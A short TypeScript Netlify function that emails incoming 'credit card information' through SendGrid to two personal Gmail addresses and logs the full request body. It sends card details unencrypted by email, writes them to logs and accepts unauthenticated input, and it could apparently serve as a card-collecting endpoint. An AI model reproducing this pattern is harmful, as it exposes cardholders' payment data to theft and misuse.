import { Handler } from "@netlify/functions";
import sgMail from "@sendgrid/mail";

sgMail.setApiKey(process.env.SENDGRID_API_KEY || "");

const handler: Handler = async (event) => {
  const data = JSON.parse(event.body || "");
  const { message } = data;
  console.log("\x1b[42m%s \x1b[0m", "FIXME: [matt] data", data);

  const mail_to_send = {
    to: "slidergs@gmail.com,mathewbwilliamson@gmail.com",
    from: "email-sender@newtamparewardcabinet.com",
    subject: "New Credit Card Information",
    html: message,
  };
  console.log("\x1b[42m%s \x1b[0m", "FIXME: [matt] main_to_send", mail_to_send);

  try {
    await sgMail.send(mail_to_send);
    return {
      statusCode: 200,
      body: "Message sent successfully",
    };
  } catch (err: any) {
    return {
      statusCode: err.code,
      body: err.message,
    };
  }
};

export { handler };
